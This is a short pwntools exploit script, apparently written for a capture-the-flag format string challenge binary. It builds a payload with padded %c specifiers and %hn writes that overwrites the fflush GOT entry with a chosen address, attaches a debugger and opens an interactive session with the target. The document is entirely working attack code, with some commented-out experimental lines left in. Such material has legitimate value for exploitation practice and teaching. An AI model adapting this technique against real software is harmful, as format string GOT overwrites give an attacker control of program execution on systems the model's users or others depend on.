from pwn import *

target = process("./chall-test_fmtString-0-x64")
gdb.attach(target, gdbscript = 'b *0x000000000040120c')

targetValue = 0x4011b6

fflushGot = 0x404038

address0 = p64(fflushGot)
address1 = p64(fflushGot + 1)
#address0 = p64(0x30303030303030)
#address1 = p64(0x31313131313131)


print0 = "%182c"
print1 = "%16219c"

write0 = "%9$hn"
write1 = "%10$hx"

payload = ""

#payload += print0
#payload += print0
#payload += write0
#payload += print1
#payload += print1
#payload += "111111"

#payload += "."

payload += "%182c"
payload += "%9$hn"
payload += "%16219c"
payload += "%10$hn"

payload += "."*(24 - len(payload))

payload += address0
payload += address1



target.sendline(payload)

target.interactive()